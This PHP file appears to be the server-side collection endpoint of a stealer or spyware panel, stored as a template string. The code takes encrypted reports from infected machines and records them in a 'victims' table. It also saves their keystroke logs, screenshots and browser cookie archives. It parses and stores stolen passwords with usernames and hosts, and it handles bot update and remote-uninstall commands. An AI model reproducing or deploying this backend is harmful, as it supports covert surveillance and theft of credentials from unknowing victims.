<?php
$apicode='
	date_default_timezone_set(\'America/New_York\');
	if (isset($_POST[\'p\'])){
		
		$mykey = "@KEY@";
		
		require(\'../config.php\');
		require(\'../mysqli.db.php\');

		$array = explode($mykey, Decrypt($_POST[\'p\'], $mykey));
		
		$type_int = $array[0];
		
		if($type_int == 0)
			$type = "info";
		elseif($type_int == 1)
			$type = "update";
		elseif($type_int == 2)
			$type = "uninstall";
		elseif($type_int == 3)
			$type = "keylog";
		elseif($type_int == 4)
			$type = "screenshots";
		elseif($type_int == 5)
			$type = "passwords";
		elseif($type_int == 6)
			$type = "cookies";
			
		$hwid = $array[1];
		$time = $array[2];
		$pcname = $array[3];
		
		if(isset($array[4]) && !empty($array[4]))
			$data = $array[4];
		
		$ip_add = getUserIP();
		$date = htmlentities(date(\'Y-m-d H:i:s\'));
	}else{
		echo "data not found.";
		exit;
	}
	
	$db = new DB($mysql_user,$mysql_password, $mysql_database, $mysql_host);
	
	if ($type == \'info\' && $hwid != \'\')
	{
		$stmt = $db->select(\'SELECT * FROM victims WHERE hwid = ? AND pc_name = ?\', array($hwid, $pcname), array(\'%s\', \'%s\') );
		$row = $stmt->num_rows;
		
		if($row < 1)
		{
			$db->insert(\'victims\', array( \'hwid\' => $hwid, \'pc_name\' => $pcname, \'ip_addres\' => $ip_add, \'time\' => $time, \'status\' => 0, \'server_time\' => $date, \'add_date\' => $date), array(\'%s\', \'%s\',\'%s\',\'%s\', \'%i\', \'%s\', \'%s\'));
		}
	}
	
    if ($type == \'keylog\' && isset($data) && $hwid != \'\')
	{
		$db->insert(\'logs\', array( \'hwid\' => $hwid, \'pc_name\' => $pcname, \'ip_addres\' => $ip_add, \'time\' => $time, \'log\' => $data, \'status\' => 0, \'server_time\' => $date), array(\'%s\', \'%s\', \'%s\',\'%s\',\'%s\', \'%i\', \'%s\'));
	}
	
	if ($type == \'cookies\' && isset($data) && $hwid != \'\'){
		$zip_name = generate_filename() . \'.zip\';
		
		$db->insert(\'cookies\', array( \'hwid\' => $hwid, \'pc_name\' => $pcname, \'time\' => $time,\'cookie\' => $zip_name, \'status\' => 0, \'server_time\' => $date), array(\'%s\', \'%s\',\'%s\',\'%s\', \'%i\', \'%s\'));
		
		$old = umask(0);
		if (!is_dir(\'../files/\'.$hwid.\'/\')) {
			mkdir(\'../files/\'.$hwid.\'/\',0755,true);
		}
		umask($old);
		base64_to_jpeg($data, \'../files/\'.$hwid.\'/\'.$zip_name);
		
		$stmt = $db->select(\'SELECT cookie, cookie_id FROM cookies WHERE hwid = ? AND pc_name = ? ORDER BY cookie_id DESC LIMIT 10, 9999\', array($hwid, $pcname), array(\'%s\', \'%s\') );
		
		while($row = $stmt->fetch_array()){
			if (file_exists(\'../files/\'.$hwid.\'/\'.$row[\'cookie\']))
				unlink(\'../files/\'.$hwid.\'/\'.$row[\'cookie\']);
		}
		
		$db2 = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . \' Invalid connect: \' . mysqli_error());
		$db2->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
		$stmt = $db2->prepare("DELETE FROM cookies WHERE cookie_id NOT IN(SELECT cookie_id FROM (SELECT cookie_id FROM cookies WHERE hwid = ? AND pc_name = ? ORDER BY cookie_id DESC LIMIT 10) t)");
		$stmt->bind_param("ss", $hwid, $pcname);
		$stmt->execute();
		$stmt->close();
		$db2->close();
	}
	
	if ($type == \'screenshots\' && isset($data) && $hwid != \'\')
	{
		$screen_name = generate_filename() . \'.jpeg\';
		
		$db->insert(\'screens\', array( \'hwid\' => $hwid, \'pc_name\' => $pcname, \'time\' => $time,\'screen\' => $screen_name, \'status\' => 0, \'server_time\' => $date), array(\'%s\', \'%s\',\'%s\',\'%s\', \'%i\', \'%s\'));
		
		$old = umask(0);
		if (!is_dir(\'../files/\'.$hwid)) {
			mkdir(\'../files/\'.$hwid,0755,true);
		}
		umask($old);
		base64_to_jpeg($data, \'../files/\'.$hwid.\'/\'.$screen_name);
		
		$stmt = $db->select(\'SELECT screen, screen_id FROM screens WHERE hwid = ? AND pc_name = ? ORDER BY screen_id DESC LIMIT 10, 9999\', array($hwid, $pcname), array(\'%s\', \'%s\') );
		
		while($row = $stmt->fetch_array()){
			if (file_exists(\'../files/\'.$hwid.\'/\'.$row[\'screen\']))
				unlink(\'../files/\'.$hwid.\'/\'.$row[\'screen\']);
		}
		
		$db2 = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . \' Invalid connect: \' . mysqli_error());
		$db2->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
		$stmt = $db2->prepare("DELETE FROM screens WHERE screen_id NOT IN(SELECT screen_id FROM (SELECT screen_id FROM screens WHERE hwid = ? AND pc_name = ? ORDER BY screen_id DESC LIMIT 10) t)");
		$stmt->bind_param("ss", $hwid, $pcname);
		$stmt->execute();
		$stmt->close();
		$db2->close();
	}

	if ($type == \'passwords\' && $hwid != \'\' && isset($data))
	{
		$db_2 = new mysqli($mysql_host, $mysql_user, $mysql_password) or die(__LINE__ . \' Invalid connect: \' . mysqli_error());
		$db_2->select_db($mysql_database) or die( "Unable to select database. Run setup first.");
		$stmt_2 = $db_2->prepare("INSERT INTO passwords(hwid, pc_name, client, host, username, pwd, time, server_time, status) VALUES (?,?,?,?,?,?,?,?,?)");
		
		echo $data;
		$accounts_array = json_decode($data, true);
		
		if(sizeof($accounts_array) > 0){
			for($i = 0; $i < sizeof($accounts_array); $i++){
				$sLink = substr($accounts_array[$i][1], 0, 99);
				$sClient = $accounts_array[$i][0];
				$sUsername = urldecode($accounts_array[$i][2]);
				$sPassword = urldecode($accounts_array[$i][3]);
				$stmt = $db->select(\'SELECT * FROM passwords WHERE hwid = ? AND client= ? AND host= ? AND username= ? AND pwd= ?\', array($hwid, $sClient, $sLink, $sUsername, $sPassword), array(\'%s\', \'%s\',\'%s\',\'%s\', \'%s\'));
				$num_row = $stmt->num_rows;
				
				if($num_row < 1)
				{
					$stmt_2->bind_param("ssssssssi", $hwid, $pcname, $sClient, $sLink, $sUsername, $sPassword,	$time, $date, $status);
					$stmt_2->execute();
				}
			}
		}
	}
	
	if ($type == \'update\' && $hwid != \'\')
	{
		$db->update(\'victims\', array( \'ip_addres\' => $ip_add, \'time\' => $time, \'server_time\' => $date ), array(\'%s\', \'%s\', \'%s%\'), array(\'hwid\' => $hwid), array(\'%s\'));
	}
	
	if($type == \'uninstall\' && $hwid != \'\'){
		
		$stmt = $db->select("SELECT status FROM uninstall WHERE hwid = ?", array($hwid), array(\'%s\'));
		$num_row = $stmt->num_rows;

		if($num_row > 1)
		{
			echo "uninstall";
			$db->delete(\'uninstall\',\'hwid\', $hwid);
		}
	}
	
	function base64_to_jpeg($base64_string, $output_file) {
		$ifp = fopen( $output_file, "wb" ); 
		fwrite( $ifp, base64_decode( $base64_string) ); 
		fclose( $ifp ); 
		return( $output_file ); 
	}
	
	function getUserIP() {
		if( array_key_exists(\'HTTP_X_FORWARDED_FOR\', $_SERVER) && !empty($_SERVER[\'HTTP_X_FORWARDED_FOR\']) ) {
			if (strpos($_SERVER[\'HTTP_X_FORWARDED_FOR\'], \',\')>0) {
				$addr = explode(",",$_SERVER[\'HTTP_X_FORWARDED_FOR\']);
				return trim($addr[0]);
			} else {
				return $_SERVER[\'HTTP_X_FORWARDED_FOR\'];
			}
		}
		else {
			return $_SERVER[\'REMOTE_ADDR\'];
		}
	}
	
	function generate_filename(){
		return str_replace(".","",uniqid(mt_rand(), true) . microtime(true));
	}

';
?>